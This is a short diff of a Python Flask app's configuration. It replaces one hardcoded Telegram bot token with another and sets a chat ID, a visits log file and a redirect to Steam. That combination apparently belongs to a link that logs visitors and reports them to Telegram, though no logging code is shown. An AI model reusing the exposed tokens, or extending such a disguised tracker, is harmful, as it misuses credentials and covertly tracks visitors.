@@ -5,7 +5,7 @@ import os
 
 app = Flask(__name__)
 
-TELEGRAM_TOKEN = "8784653369:AAFfKAiDIKX2O5uDcwtBIP-LjkTixwfBF2o"
+TELEGRAM_TOKEN = "8903499518:AAHzSL9SGMpwgZy0k-4BB1XXHm3clbkHgks"
 CHAT_ID = "7352598189"
 LOG_FILE = "visits.txt"
 REDIRECT_URL = "https://steamcommunity.com/"
